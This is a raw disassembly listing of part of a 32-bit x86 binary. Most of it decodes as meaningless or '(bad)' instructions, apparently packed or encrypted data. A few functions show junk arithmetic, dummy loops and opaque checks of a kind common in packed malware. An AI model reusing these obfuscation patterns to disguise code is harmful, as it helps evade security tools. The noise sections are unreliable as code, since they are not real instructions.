  40a040:	outs   dx,DWORD PTR ds:[esi]
  40a041:	sub    al,0x5a
  40a043:	add    ecx,DWORD PTR ds:0xd202f49f
  40a049:	push   cs
  40a04a:	sub    edi,edi
  40a04c:	mov    esp,0x86c2675e
  40a051:	outs   dx,DWORD PTR ds:[esi]
  40a052:	cmp    bl,BYTE PTR [ebx]
  40a054:	cs pop ds
  40a056:	shl    BYTE PTR [esi],1
  40a058:	sub    eax,0x21d8f73a
  40a05d:	push   ss
  40a05e:	bound  esi,QWORD PTR [ecx-0x2e8ba37]
  40a064:	sar    BYTE PTR [eax],cl
  40a066:	pop    ebx
  40a067:	retf   
  40a068:	ss jle 0x40a07a
  40a06b:	leave  
  40a06c:	and    eax,0x7d0073d1
  40a071:	aam    0x20
  40a073:	cs leave 
  40a075:	dec    edx
  40a076:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a078:	clc    
  40a079:	push   ds
  40a07a:	and    eax,0x1128ac31
  40a07f:	push   ss
  40a080:	ja     0x40a0d5
  40a082:	fs aam 0xc6
  40a085:	test   al,0x39
  40a087:	or     DWORD PTR [eax+0x1559e95f],edi
  40a08d:	push   eax
  40a08e:	mov    esp,0xc8f06b00
  40a093:	(bad)  [eax]
  40a095:	jecxz  0x40a10d
  40a097:	jns    0x40a038
  40a099:	into   
  40a09a:	lock fnstcw WORD PTR [ebx+0x5acbceda]
  40a0a1:	sbb    eax,0x3e709734
  40a0a6:	(bad)  
  40a0a8:	out    dx,al
  40a0a9:	or     DWORD PTR [esi+0x18bd5e9],ebp
  40a0af:	sub    esi,DWORD PTR [edx-0x5]
  40a0b2:	sbb    eax,0xd04d248
  40a0b7:	or     al,0xf5
  40a0b9:	xchg   DWORD PTR [edx],ecx
  40a0bb:	popa   
  40a0bc:	imul   esi,DWORD PTR [edx+0x6b],0xa8909a10
  40a0c3:	ss or  eax,edi
  40a0c6:	xor    cl,bl
  40a0c8:	fidivr DWORD PTR [esi]
  40a0ca:	not    BYTE PTR [ebp-0x2578ddc3]
  40a0d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a0d1:	fs or  ebx,esi
  40a0d4:	pop    esp
  40a0d5:	out    0x4f,al
  40a0d7:	or     dl,ch
  40a0d9:	push   ss
  40a0da:	push   edi
  40a0db:	enter  0x77b8,0x3c
  40a0df:	mov    ebp,0xc60f1639
  40a0e4:	in     al,dx
  40a0e5:	daa    
  40a0e6:	mov    ds:0xfb0fda0c,al
  40a0eb:	dec    ecx
  40a0ec:	cdq    
  40a0ed:	push   ss
  40a0ee:	xchg   BYTE PTR [esi],ch
  40a0f0:	push   ds
  40a0f1:	adc    DWORD PTR [ebx],esp
  40a0f3:	shl    BYTE PTR [esi+0x38],1
  40a0f6:	loopne 0x40a0af
  40a0f8:	jle    0x40a081
  40a0fa:	push   0xfffffff8
  40a0fc:	adc    DWORD PTR [ecx+0x1b91125c],ebp
  40a102:	xchg   edx,eax
  40a103:	fld    DWORD PTR [ecx]
  40a105:	jl     0x40a0bb
  40a107:	rol    BYTE PTR [edi],1
  40a109:	cmp    DWORD PTR [eax+0x9],ebp
  40a10c:	ja     0x40a0f8
  40a10e:	fucom  st(6)
  40a110:	adc    al,BYTE PTR [edi]
  40a112:	test   eax,0xc831e752
  40a117:	(bad)  
  40a118:	xor    eax,0xb1c1193e
  40a11d:	sbb    DWORD PTR [ebx],esi
  40a11f:	cmp    eax,0x9cff99b2
  40a125:	xor    eax,0x50fa417c
  40a12a:	rcr    ah,0x80
  40a12d:	mov    ds:0x4b9a8bf7,eax
  40a132:	mov    edx,0xf91e8ec1
  40a137:	xchg   ebp,eax
  40a138:	push   ecx
  40a139:	aad    0xf0
  40a13b:	jne    0x40a10e
  40a13d:	cwde   
  40a13e:	mov    dh,0x3d
  40a140:	shl    BYTE PTR [edi+0x7e],1
  40a143:	pop    ebp
  40a144:	cmp    DWORD PTR [eax-0x1],0xffffff9b
  40a148:	out    0xfd,al
  40a14a:	or     DWORD PTR [ecx],eax
  40a14c:	ret    
  40a14d:	adc    DWORD PTR [edx+0x153221ae],0xfa458ef8
  40a157:	fs mov ah,0x3c
  40a15a:	mov    gs,WORD PTR [eax+0x28eedd03]
  40a160:	jg     0x40a185
  40a162:	xchg   DWORD PTR [edi+0x64],ebx
  40a165:	(bad)  
  40a166:	(bad)  
  40a168:	add    BYTE PTR [ecx-0x73],bl
  40a16b:	inc    esi
  40a16c:	jle    0x40a185
  40a16e:	push   edi
  40a16f:	jb     0x40a120
  40a171:	inc    eax
  40a172:	mov    ds,esi
  40a174:	sbb    DWORD PTR [esi+ebx*4-0x14],edx
  40a178:	mov    ebx,0xf1dcea78
  40a17d:	je     0x40a102
  40a17f:	pop    edx
  40a180:	xlat   BYTE PTR ds:[ebx]
  40a181:	xor    eax,0xaf0fd33c
  40a186:	push   0xb626564c
  40a18b:	ror    BYTE PTR [edi-0x3069405],cl
  40a191:	adc    BYTE PTR ss:[esi+eax*1],al
  40a195:	popf   
  40a196:	inc    edx
  40a197:	inc    ecx
  40a198:	xor    bh,bl
  40a19a:	or     DWORD PTR [ebp-0x3d],0x79
  40a19e:	or     ch,bh
  40a1a0:	mov    eax,0xa755cc19
  40a1a5:	shr    BYTE PTR [ebx+0x4b8e98f7],0xde
  40a1ac:	scas   al,BYTE PTR es:[edi]
  40a1ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a1ae:	ss es mov ebx,0x5fe9e4da
  40a1b5:	mov    al,BYTE PTR [esi-0x25c1431a]
  40a1bb:	pop    edx
  40a1bc:	mov    esp,DWORD PTR [esp+ebp*2-0x70]
  40a1c0:	mov    ch,0xc7
  40a1c2:	inc    ebp
  40a1c3:	outs   dx,BYTE PTR ds:[esi]
  40a1c4:	arpl   cx,si
  40a1c6:	hlt    
  40a1c7:	jno    0x40a1bf
  40a1c9:	in     al,dx
  40a1ca:	cmp    BYTE PTR [ebp+0xd5127ff],al
  40a1d0:	jg     0x40a217
  40a1d2:	or     esi,DWORD PTR [esi+0x58]
  40a1d5:	iret   
  40a1d6:	(bad)  
  40a1d7:	fsubp  st(0),st
  40a1d9:	xchg   ebp,eax
  40a1da:	sbb    BYTE PTR [ecx+0x15],dl
  40a1dd:	push   cs
  40a1de:	sbb    DWORD PTR [ebx],esi
  40a1e0:	dec    ebx
  40a1e1:	cmp    DWORD PTR [eax],esp
  40a1e3:	mov    edx,0x4bb4821e
  40a1e8:	rcl    DWORD PTR ds:0xdd22d570,1
  40a1ee:	in     eax,0x47
  40a1f0:	jae    0x40a254
  40a1f2:	push   eax
  40a1f3:	mov    ebx,0x6712a097
  40a1f8:	out    0xf7,al
  40a1fa:	or     eax,0xf03b42f3
  40a1ff:	jne    0x40a21b
  40a205:	mov    eax,DWORD PTR [ebp-0x4]
  40a208:	mov    esi,DWORD PTR [ebp-0x8]
  40a20b:	xor    eax,edx
  40a20d:	xor    esi,edx
  40a20f:	add    eax,ecx
  40a211:	add    esi,ecx
  40a213:	imul   eax,esi
  40a216:	jmp    0x40a256
  40a21b:	mov    eax,DWORD PTR [ebp+0xc]
  40a21e:	mov    eax,DWORD PTR [eax+0x78]
  40a221:	mov    DWORD PTR [ebp+0xc],eax
  40a224:	mov    eax,DWORD PTR [ebp-0x4]
  40a227:	mov    esi,DWORD PTR [ebp-0x8]
  40a22a:	xor    eax,edx
  40a22c:	xor    esi,edx
  40a22e:	add    eax,ecx
  40a230:	add    esi,ecx
  40a232:	imul   eax,esi
  40a235:	mov    esi,DWORD PTR [ebp+0xc]
  40a238:	cmp    esi,eax
  40a23a:	mov    eax,DWORD PTR [ebp-0x4]
  40a23d:	je     0x40a208
  40a243:	xor    eax,edx
  40a245:	add    eax,ecx
  40a247:	mov    ecx,DWORD PTR [ebp+0xc]
  40a24a:	imul   eax,ecx
  40a24d:	add    eax,DWORD PTR [ebp+0x8]
  40a250:	mov    DWORD PTR [ebp+0xc],eax
  40a253:	mov    eax,DWORD PTR [ebp+0xc]
  40a256:	pop    esi
  40a257:	leave  
  40a258:	ret    0x8
  40a25b:	push   ebp
  40a25c:	mov    ebp,esp
  40a25e:	sub    esp,0x10
  40a261:	sbb    eax,DWORD PTR ds:0x413c88
  40a267:	mov    eax,0xf89c85b0
  40a26c:	xor    edx,edx
  40a26e:	xor    edx,DWORD PTR ds:0x414014
  40a274:	sub    DWORD PTR ds:0x413cf4,edx
  40a27a:	mov    DWORD PTR [ebp-0x4],eax
  40a27d:	add    ecx,ecx
  40a27f:	mov    DWORD PTR [ebp-0x8],0xf89c85b1
  40a286:	or     DWORD PTR ds:0x414014,edi
  40a28c:	mov    ecx,DWORD PTR [ebp-0x4]
  40a28f:	push   esi
  40a290:	mov    edx,0x7510894
  40a295:	add    esi,0x25d7
  40a29b:	xor    ecx,edx
  40a29d:	mov    DWORD PTR ds:0x413d30,0x18
  40a2a7:	cmp    DWORD PTR ds:0x413d30,0x0
  40a2ae:	je     0x40a2e4
  40a2b4:	cmp    DWORD PTR ds:0x413d30,0x19
  40a2bb:	jne    0x40a2cc
  40a2c1:	push   0x413ce8
  40a2c6:	call   DWORD PTR ds:0x41679c
  40a2cc:	mov    esi,DWORD PTR ds:0x413d30
  40a2d2:	dec    esi
  40a2d3:	mov    DWORD PTR ds:0x413d30,esi
  40a2d9:	jmp    0x40a2a7
  40a2de:	add    esi,DWORD PTR ds:0x413d24
  40a2e4:	mov    esi,0x3272dc
  40a2e9:	neg    DWORD PTR ds:0x413d24
  40a2ef:	push   edi
  40a2f0:	mov    edi,DWORD PTR [ebp+0x10]
  40a2f3:	adc    DWORD PTR ds:0x414008,0x741e
  40a2fd:	add    ecx,esi
  40a2ff:	cmp    ecx,edi
  40a301:	mov    DWORD PTR ds:0x413c80,0x1b1e
  40a30b:	je     0x40a474
  40a311:	mov    ecx,DWORD PTR [ebp-0x4]
  40a314:	mov    edi,DWORD PTR [ebp+0x10]
  40a317:	xor    eax,eax
  40a319:	xor    ecx,edx
  40a31b:	adc    DWORD PTR ds:0x413d2c,0x414008
  40a325:	add    ecx,esi
  40a327:	add    edi,0xfabdbeef
  40a32d:	adc    eax,0xffffffff
  40a330:	neg    DWORD PTR ds:0x413c88
  40a336:	xor    eax,0x0
  40a339:	mov    DWORD PTR [ebp-0xc],eax
  40a33c:	push   ebx
  40a33d:	movzx  eax,BYTE PTR ds:0x413d30
  40a344:	adc    DWORD PTR ds:0x414018,eax
  40a34a:	xor    ebx,ebx
  40a34c:	xor    edi,0x8a29a125
  40a352:	mov    eax,ds:0x413c12
  40a357:	and    DWORD PTR ds:0x413cdc,eax
  40a35d:	mov    eax,ecx
  40a35f:	add    eax,0xfabdbeef
  40a364:	mov    DWORD PTR ds:0x413c6c,0x7b3
  40a36e:	adc    ebx,0xffffffff
  40a371:	add    DWORD PTR ds:0x413c88,0x414018
  40a37b:	xor    eax,0x8a29a125
  40a380:	mov    DWORD PTR ds:0x413d18,0x6932
  40a38a:	xor    ebx,0x0
  40a38d:	mov    DWORD PTR ds:0x413cd8,0x53fd
  40a397:	cmp    eax,edi
  40a399:	mov    DWORD PTR ds:0x413c88,0x1215
  40a3a3:	jne    0x40a3c6
  40a3a9:	mov    DWORD PTR ds:0x413c16,0x2565
  40a3b3:	cmp    ebx,DWORD PTR [ebp-0xc]
  40a3b6:	je     0x40a46e
  40a3bc:	jmp    0x40a3c6
  40a3c1:	mov    esi,0x3272dc
  40a3c6:	and    DWORD PTR ds:0x413d30,0x0
  40a3d0:	xor    eax,eax
  40a3d2:	xor    eax,DWORD PTR ds:0x413d30
  40a3d8:	inc    eax
  40a3d9:	mov    ds:0x413d30,eax
  40a3de:	cmp    DWORD PTR ds:0x413d30,0x26
  40a3e5:	jne    0x40a3f9
  40a3eb:	push   0x413d20
  40a3f0:	push   DWORD PTR [ebp-0x10]
  40a3f3:	call   DWORD PTR ds:0x41675c
  40a3f9:	cmp    DWORD PTR ds:0x413d30,0x1f
  40a400:	jb     0x40a3d0
  40a406:	mov    eax,DWORD PTR [ebp-0x4]
  40a409:	mov    edi,DWORD PTR [ebp-0x8]
  40a40c:	xor    edi,edx
  40a40e:	add    edi,esi
  40a410:	mov    esi,DWORD PTR [ebp+0x8]
  40a413:	imul   edi,ecx
  40a416:	mov    ebx,DWORD PTR [ebp+0xc]
  40a419:	xor    eax,edx
  40a41b:	add    eax,ecx
  40a41d:	mov    al,BYTE PTR [ebx+eax*1+0x3272dc]
  40a424:	mov    BYTE PTR [edi+esi*1],al
  40a427:	mov    eax,DWORD PTR [ebp-0x8]
  40a42a:	mov    esi,DWORD PTR [ebp+0x10]
  40a42d:	xor    eax,edx
  40a42f:	xor    ebx,ebx
  40a431:	add    esi,0xfabdbeef
  40a437:	adc    ebx,0xffffffff
  40a43a:	lea    ecx,[ecx+eax*1+0x3272dc]
  40a441:	xor    edi,edi
  40a443:	xor    esi,0x8a29a125
  40a449:	xor    ebx,0x0
  40a44c:	mov    eax,ecx
  40a44e:	add    eax,0xfabdbeef
  40a453:	adc    edi,0xffffffff
  40a456:	xor    eax,0x8a29a125
  40a45b:	xor    edi,0x0
  40a45e:	cmp    eax,esi
  40a460:	jne    0x40a3c1
  40a466:	cmp    edi,ebx
  40a468:	jne    0x40a3c1
  40a46e:	mov    eax,0xf89c85b1
  40a473:	pop    ebx
  40a474:	pop    edi
  40a475:	pop    esi
  40a476:	leave  
  40a477:	ret    0xc
  40a47a:	push   ebp
  40a47b:	mov    ebp,esp
  40a47d:	sub    esp,0xa4
  40a483:	sbb    DWORD PTR ds:0x413cf4,0x6aac
  40a48d:	mov    ecx,DWORD PTR [ebp+0x8]
  40a490:	and    DWORD PTR ds:0x414008,0x0
  40a49a:	mov    eax,ds:0x414008
  40a49f:	inc    eax
  40a4a0:	mov    ds:0x414008,eax
  40a4a5:	cmp    DWORD PTR ds:0x414008,0x6
  40a4ac:	jne    0x40a4c5
  40a4b2:	push   DWORD PTR [ebp-0x18]
  40a4b5:	push   0x41401c
  40a4ba:	push   0x1f9d
  40a4bf:	call   DWORD PTR ds:0x416760
  40a4c5:	cmp    DWORD PTR ds:0x414008,0x5
  40a4cc:	jne    0x40a4dd
  40a4d2:	mov    eax,ds:0x414008
  40a4d7:	inc    eax
  40a4d8:	mov    ds:0x414008,eax
  40a4dd:	cmp    DWORD PTR ds:0x414008,0x1b
  40a4e4:	jb     0x40a49a
  40a4ea:	mov    DWORD PTR ds:0x41401c,0x17
  40a4f4:	cmp    DWORD PTR ds:0x41401c,0x0
  40a4fb:	je     0x40a54c
  40a501:	cmp    DWORD PTR ds:0x41401c,0x6
  40a508:	jne    0x40a524
  40a50e:	push   DWORD PTR [ebp-0x24]
  40a511:	push   0x3b56
  40a516:	push   DWORD PTR [ebp-0x1c]
  40a519:	push   0x73b3
  40a51e:	call   DWORD PTR ds:0x416764
  40a524:	cmp    DWORD PTR ds:0x41401c,0x7
  40a52b:	jne    0x40a53c
  40a531:	mov    eax,ds:0x41401c
  40a536:	dec    eax
  40a537:	mov    ds:0x41401c,eax
  40a53c:	mov    eax,ds:0x41401c
  40a541:	dec    eax
  40a542:	mov    ds:0x41401c,eax
  40a547:	jmp    0x40a4f4
  40a54c:	mov    eax,0x8a87
  40a551:	xor    ax,WORD PTR [ecx+0x20]
  40a555:	not    DWORD PTR ds:0x413cf4
  40a55b:	mov    ecx,0x3b4a
  40a560:	adc    DWORD PTR ds:0x413c0a,0x414008
  40a56a:	add    ax,cx
  40a56d:	movzx  eax,ax
  40a570:	mov    DWORD PTR [ebp-0x18],eax
  40a573:	mov    ecx,DWORD PTR ds:0x413c78
  40a579:	sbb    DWORD PTR ds:0x413d28,ecx
  40a57f:	mov    BYTE PTR [ebp-0x1],0x7d
  40a583:	add    ecx,DWORD PTR ds:0x414000
  40a589:	lea    eax,[ebp-0x1]
  40a58c:	xor    DWORD PTR ds:0x413c78,ecx
  40a592:	mov    DWORD PTR [ebp-0x10],eax
  40a595:	add    DWORD PTR ds:0x413d1c,0x4151
  40a59f:	mov    al,BYTE PTR [ebp-0x1]
  40a5a2:	mov    ecx,DWORD PTR [ebp-0x10]
  40a5a5:	or     DWORD PTR ds:0x413d20,0x66e0
  40a5af:	xor    al,0x70
  40a5b1:	and    DWORD PTR ds:0x414000,0x34d9
  40a5bb:	sub    al,0xc
  40a5bd:	and    DWORD PTR ds:0x413d1c,0x413c70
  40a5c7:	mov    BYTE PTR [ecx],al
  40a5c9:	mov    DWORD PTR [ebp-0x14],0xf89c85b0
  40a5d0:	or     DWORD PTR ds:0x413ce0,ecx
  40a5d6:	push   ebx
  40a5d7:	jmp    0x40c95f
  40a5dc:	and    ch,BYTE PTR ds:0xb393b193
  40a5e2:	add    cl,BYTE PTR [edi-0x6bf6fe89]
  40a5e8:	sbb    al,0x8d
  40a5ea:	fisttp DWORD PTR [ecx+0x27]
  40a5ed:	push   es
  40a5ee:	jl     0x40a66c
  40a5f0:	pop    es
  40a5f1:	pop    edi
  40a5f2:	jl     0x40a670
  40a5f4:	push   ds
  40a5f5:	jg     0x40a5c0
  40a5f7:	lea    ebx,[eax]
  40a5f9:	or     dh,BYTE PTR [esi+edi*1+0x53cf47d6]
  40a600:	ret    
  40a601:	std    
  40a602:	sub    BYTE PTR [ecx+esi*8-0x51],0xfe
  40a607:	fdiv   QWORD PTR [edx-0x2a]
  40a60a:	push   0x7
  40a60c:	xchg   edx,eax
  40a60d:	repnz mov esi,0x9fdae83b
  40a613:	jecxz  0x40a59d
  40a615:	or     bl,dh
  40a617:	std    
  40a618:	lock sti 
  40a61a:	sysret 
  40a61c:	int3   
  40a61d:	(bad)  
  40a61e:	push   esi
  40a61f:	mov    dl,0xda
  40a621:	sub    ah,BYTE PTR [ebx+0x7825614f]
  40a627:	mov    dh,0xb1
  40a629:	push   eax
  40a62a:	sahf   
  40a62b:	inc    esi
  40a62c:	jecxz  0x40a676
  40a62e:	outs   dx,DWORD PTR ds:[esi]
  40a62f:	adc    edx,esi
  40a631:	mov    bh,0x20
  40a633:	mov    ebp,0xcbc05861
  40a638:	inc    esp
  40a639:	sub    DWORD PTR [eax+0x30],ecx
  40a63c:	xchg   ebx,eax
  40a63d:	push   ss
  40a63e:	jnp    0x40a651
  40a640:	and    ebp,DWORD PTR [edx-0x4f]
  40a643:	ja     0x40a663
  40a645:	xchg   ebp,ecx
  40a647:	cmp    eax,DWORD PTR [edx]
  40a649:	in     eax,0xbc
  40a64b:	sar    cl,cl
  40a64d:	mov    WORD PTR [esp+ecx*8],ds
  40a650:	adc    al,0x16
  40a652:	aad    0xe4
  40a654:	inc    edx
  40a655:	inc    esi
  40a656:	sub    DWORD PTR [edi+0x7f],ecx
  40a659:	xor    cl,cl
  40a65b:	dec    ebx
  40a65c:	xchg   esp,eax
  40a65d:	stos   DWORD PTR es:[edi],eax
  40a65e:	popa   
  40a65f:	inc    edx
  40a660:	nop
  40a661:	dec    eax
  40a662:	mov    esi,0x3b6101fa
  40a667:	sti    
  40a668:	xchg   esp,eax
  40a669:	and    DWORD PTR [edi-0x1fcd62e8],ecx
  40a66f:	fild   DWORD PTR [esi]
  40a671:	(bad)  
  40a672:	sub    eax,DWORD PTR [ecx-0x6819c596]
  40a678:	stos   DWORD PTR es:[edi],eax
  40a679:	cli    
  40a67a:	xor    ecx,edx
  40a67c:	or     edx,ebp
  40a67e:	adc    esp,esi
  40a680:	xchg   esp,eax
  40a681:	jp     0x40a69a
  40a683:	jp     0x40a6db
  40a685:	(bad)  
  40a686:	fdivr  st,st(5)
  40a688:	mov    ecx,0x5fc4422b
  40a68d:	pushf  
  40a68e:	xchg   edi,eax
  40a68f:	test   BYTE PTR [edx-0x61],al
  40a692:	popf   
  40a693:	push   esp
  40a694:	bnd jns 0x40a657
  40a697:	(bad)  
  40a698:	xchg   edi,eax
  40a699:	sbb    al,al
  40a69b:	adc    BYTE PTR [eax-0x70b69145],dh
  40a6a1:	dec    edi
  40a6a2:	dec    edx
  40a6a3:	push   0x8427239
  40a6a8:	pop    ebp
  40a6a9:	inc    ebp
  40a6aa:	retf   0x397a
  40a6ad:	xchg   ecx,eax
  40a6ae:	jle    0x40a6b0
  40a6b0:	adc    eax,0x24475025
  40a6b5:	rcl    DWORD PTR [ecx],cl
  40a6b7:	ret    0x9ce2
  40a6ba:	lods   al,BYTE PTR ds:[esi]
  40a6bb:	pop    eax
  40a6bc:	lahf   
  40a6bd:	loope  0x40a6f8
  40a6bf:	xchg   BYTE PTR [ecx-0x3a],dl
  40a6c2:	imul   edi,DWORD PTR [esi-0x52],0x83280ba5
  40a6c9:	adc    esi,DWORD PTR [edi]
  40a6cb:	mov    eax,ds:0x8581b0e9
  40a6d0:	pop    ebp
  40a6d1:	test   eax,0xd1ba13f6
  40a6d6:	je     0x40a66d
  40a6d8:	arpl   WORD PTR [eax-0x35],cx
  40a6db:	daa    
  40a6dc:	jge    0x40a6f8
  40a6de:	test   DWORD PTR [edx-0x7c],ebx
  40a6e1:	jge    0x40a67f
  40a6e3:	icebp  
  40a6e4:	mov    BYTE PTR [esi],ah
  40a6e6:	or     BYTE PTR [esi-0x37],bh
  40a6e9:	icebp  
  40a6ea:	sbb    edx,ebx
  40a6ec:	mov    esi,0x78b26c0f
  40a6f1:	stos   DWORD PTR es:[edi],eax
  40a6f2:	or     ah,dh
  40a6f4:	repnz sub al,0xa9
  40a6f7:	arpl   WORD PTR [ebx+0x3f],cx
  40a6fa:	test   eax,0x5026e590
  40a6ff:	movd   DWORD PTR [esi+0x6f],mm7
  40a703:	ja     0x40a6f7
  40a705:	or     eax,0xe194bab4
  40a70a:	test   esi,edi
  40a70c:	and    eax,0x6fbb4824
  40a711:	xor    DWORD PTR [ebp-0x3],ecx
  40a714:	(bad)  
  40a715:	test   eax,0xe5893d59
  40a71a:	es into 
  40a71c:	retf   0xe801
  40a71f:	and    al,ch
  40a721:	pop    ebx
  40a722:	shr    DWORD PTR [eax],1
  40a724:	mov    ds:0xd5beb1b2,eax
  40a729:	in     eax,dx
  40a72a:	or     cl,BYTE PTR [edi]
  40a72c:	mov    ds:0x2fee080d,al
  40a731:	cs dec esi
  40a733:	imul   ebp,DWORD PTR [esi-0x9],0xffffff89
  40a737:	retf   0xfdfb
  40a73a:	mov    cl,0x13
  40a73c:	inc    DWORD PTR [eax+eiz*8]
  40a73f:	jg     0x40a7bb
  40a741:	xor    eax,0x422fe6a1
  40a746:	or     eax,0x3ccb86b0
  40a74b:	push   esi
  40a74c:	mov    ds,WORD PTR [edx+0x2a63480c]
  40a752:	cmp    DWORD PTR [edi],edi
  40a754:	(bad)  
  40a755:	adc    BYTE PTR [ecx-0x79],al
  40a758:	ret    
  40a759:	popa   
  40a75a:	pop    eax
  40a75b:	(bad)  
  40a75c:	popw   ss
  40a75e:	or     BYTE PTR [edx+eax*1],ch
  40a761:	cmp    ch,BYTE PTR [eax]
  40a763:	sub    eax,0x11bae1e
  40a768:	pop    eax
  40a769:	or     al,0x82
  40a76b:	imul   edi,DWORD PTR [edi+0x49],0xc818f00
  40a772:	popa   
  40a773:	cli    
  40a774:	in     eax,0xf9
  40a776:	arpl   WORD PTR [esi],sp
  40a778:	sub    edx,ebx
  40a77a:	nop
  40a77b:	mov    bh,0xad
  40a77d:	out    dx,al
  40a77e:	retf   
  40a77f:	cmp    eax,0x3fdf65b7
  40a784:	ret    
  40a785:	sub    DWORD PTR [esi],ebx
  40a787:	mov    al,ds:0xa8602526
  40a78c:	mov    ch,0x90
  40a78e:	retf   0xa0fb
  40a791:	outs   dx,DWORD PTR ds:[esi]
  40a792:	or     ah,0x18
  40a795:	xor    ebx,ebp
  40a797:	xor    esi,DWORD PTR [ecx]
  40a799:	or     al,0x76
  40a79b:	pop    ss
  40a79c:	loopne 0x40a742
  40a79e:	enter  0x8d5d,0x13
  40a7a2:	mov    ds:0x371c1b83,eax
  40a7a7:	in     eax,dx
  40a7a8:	sahf   
  40a7a9:	stc    
  40a7aa:	fisub  DWORD PTR [ebp-0x4a]
  40a7ad:	push   es
  40a7ae:	scas   al,BYTE PTR es:[edi]
  40a7af:	popf   
  40a7b0:	xchg   ebx,eax
  40a7b1:	jle    0x40a7f7
  40a7b3:	fdivr  QWORD PTR [esi+0x6a61873e]
  40a7b9:	cmp    BYTE PTR [esi-0x25583bf7],dl
  40a7bf:	popf   
  40a7c0:	mov    ebp,0xd3603c55
  40a7c5:	dec    edi
  40a7c6:	xchg   edi,edi
  40a7c8:	loope  0x40a7f2
  40a7ca:	imul   edi,DWORD PTR [eax+0x5e],0x70bea7e0
  40a7d1:	loop   0x40a776
  40a7d3:	xchg   edi,eax
  40a7d4:	mov    ebp,0x1e73f391
  40a7d9:	rcl    ecx,1
  40a7db:	fs jo  0x40a84c
  40a7de:	xchg   ecx,eax
  40a7df:	scas   al,BYTE PTR es:[edi]
  40a7e0:	(bad)  
  40a7e1:	xlat   BYTE PTR ds:[ebx]
  40a7e2:	sub    eax,0xc8cf6c6d
  40a7e7:	repnz sahf 
  40a7e9:	sub    eax,0xe0a00af7
  40a7ee:	cmp    DWORD PTR [ecx+0x2a2cf0b2],ecx
  40a7f4:	and    eax,0x31fe8e8a
  40a7f9:	or     eax,0xd7974613
  40a7fe:	or     edi,DWORD PTR [eax+0x4301eace]
  40a804:	jo     0x40a86c
  40a806:	or     edx,DWORD PTR [ebp-0x54f552c1]
  40a80c:	jb     0x40a837
  40a80e:	out    0xf7,eax
  40a810:	aaa    
  40a811:	cld    
  40a812:	lods   al,BYTE PTR ds:[esi]
  40a813:	jno    0x40a7fd
  40a815:	or     al,0xe2
  40a817:	mov    bh,0xa1
  40a819:	sbb    eax,DWORD PTR [ebp-0x69375c8e]
  40a81f:	dec    edx
  40a820:	push   ecx
  40a821:	or     DWORD PTR [ebp-0x5fc5f429],esp
  40a827:	ins    DWORD PTR es:[edi],dx
  40a828:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a829:	pop    ebp
  40a82a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a82b:	dec    DWORD PTR [ebp+edi*8+0x3b]
  40a82f:	scas   al,BYTE PTR es:[edi]
  40a830:	out    dx,al
  40a831:	dec    edx
  40a832:	mov    cl,0x74
  40a834:	jmp    0xd1ce2964
  40a839:	xchg   ebx,eax
  40a83a:	cld    
  40a83b:	jp     0x40a828
  40a83d:	xchg   ebx,eax
  40a83e:	mov    BYTE PTR ss:[edi+eiz*1+0x72],bh
  40a843:	scas   al,BYTE PTR es:[edi]
  40a844:	lock xchg esp,eax
  40a846:	inc    edx
  40a847:	cmp    BYTE PTR [eax+0x2e],al
  40a84a:	or     cl,BYTE PTR [edx-0x47]
  40a84d:	inc    esi
  40a84e:	lock adc dh,BYTE PTR ss:[edx-0x33]
  40a853:	into   
  40a854:	enter  0x2970,0xe4
  40a858:	int3   
  40a859:	int    0x9f
  40a85b:	lods   eax,DWORD PTR ds:[esi]
  40a85c:	xchg   edx,eax
  40a85d:	dec    edi
  40a85e:	in     eax,0xc
  40a860:	repnz rol DWORD PTR [ecx+0xc],cl
  40a864:	add    al,0x26
  40a866:	(bad)  [edx-0x590baf22]
  40a86c:	adc    bh,BYTE PTR [ebp+0x8]
  40a86f:	inc    esp
  40a870:	(bad)  
  40a871:	cmp    al,0x9b
  40a873:	sbb    DWORD PTR [ebx],ebx
  40a875:	add    DWORD PTR [ecx+0xca5f5b4],0x66
  40a87c:	dec    edx
  40a87d:	xchg   edx,eax
  40a87e:	cmp    BYTE PTR [eax+ecx*4-0x51a736ba],0xec
  40a886:	int3   
  40a887:	ret    
  40a888:	pop    ebx
  40a889:	jp     0x40a84d
  40a88b:	inc    esi
  40a88c:	out    0x6e,al
  40a88e:	ja     0x40a869
  40a890:	mov    eax,0x10fb810d
  40a895:	xchg   ebp,eax
  40a896:	ja     0x40a830
  40a898:	data16 fs fcmovb st,st(0)
  40a89c:	cs jecxz 0x40a846
  40a89f:	pop    edx
  40a8a0:	jmp    DWORD PTR [ebx]
  40a8a2:	sti    
  40a8a3:	aaa    
  40a8a4:	xchg   ebx,eax
  40a8a5:	cwde   
  40a8a6:	fyl2x  
  40a8a8:	in     al,0x20
  40a8aa:	or     eax,0x936ee0f5
  40a8af:	mov    dl,bl
  40a8b1:	ins    BYTE PTR es:[edi],dx
  40a8b2:	sub    al,0xb8
  40a8b4:	and    BYTE PTR [ebp+0x353a548d],ah
  40a8ba:	lods   al,BYTE PTR ds:[esi]
  40a8bb:	cmp    al,0x7b
  40a8bd:	sub    edi,DWORD PTR [edx-0x34]
  40a8c0:	jmp    0x40a8d3
  40a8c2:	or     al,0x66
  40a8c4:	push   esp
  40a8c5:	jbe    0x40a8b9
  40a8c7:	mov    DWORD PTR [ebx-0x6c44b86],edi
  40a8cd:	aaa    
  40a8ce:	leave  
  40a8cf:	xchg   dl,al
  40a8d1:	mov    ecx,DWORD PTR [edx-0x29b75f7e]
  40a8d7:	pop    eax
  40a8d8:	push   es
  40a8d9:	div    BYTE PTR [edx+edi*4+0x690db180]
  40a8e0:	or     eax,0x657d5d19
  40a8e5:	adc    ah,cl
  40a8e7:	xchg   BYTE PTR [ebp+0x2a],ah
  40a8ea:	rol    ebp,cl
  40a8ec:	cmp    BYTE PTR [ecx+0x4],dh
  40a8ef:	adc    DWORD PTR [eax-0x66],edi
  40a8f2:	add    BYTE PTR [esi-0x2a5536da],al
  40a8f8:	outs   dx,BYTE PTR ds:[esi]
  40a8f9:	add    eax,0x51a2e24d
  40a8fe:	pushf  
  40a8ff:	stos   DWORD PTR es:[edi],eax
  40a900:	fdiv   QWORD PTR [edx+0x6a7c95f1]
  40a906:	adc    dh,bh
  40a908:	es sahf 
  40a90a:	mov    al,ds:0xd94cdaf
  40a90f:	cdq    
  40a910:	cld    
